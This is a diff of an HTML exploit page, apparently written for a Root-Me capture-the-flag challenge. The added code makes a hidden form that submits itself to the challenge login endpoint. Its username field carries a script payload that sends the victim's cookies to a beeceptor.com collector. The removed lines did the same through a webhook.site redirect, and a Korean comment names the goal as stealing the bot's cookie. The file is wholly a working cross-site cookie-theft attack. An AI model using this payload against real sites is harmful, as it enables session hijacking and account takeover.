@@ -1,8 +1,12 @@
 <html>
-<body>
+  <body>
+    <form id="exploit-form" action="http://challenge01.root-me.org:58039/login" method="POST">
+      <input type="hidden" name="username" value="<script>document.location='https://server.free.beeceptor.com/?cookie='+document.cookie</script>" />
+      <input type="hidden" name="password" value="anypassword" />
+      <input type="hidden" name="_csrf" value="DUMMY_TOKEN" /> 
+    </form>
     <script>
-        // 봇의 쿠키를 탈취하여 webhook.site URL로 전송
-        window.location.href = 'https://webhook.site/38fc72a2-7aa1-4587-aedb-1ca7314ad130/?cookie=' + encodeURIComponent(document.cookie);
+      document.getElementById('exploit-form').submit();
     </script>
-</body>
+  </body>
 </html>
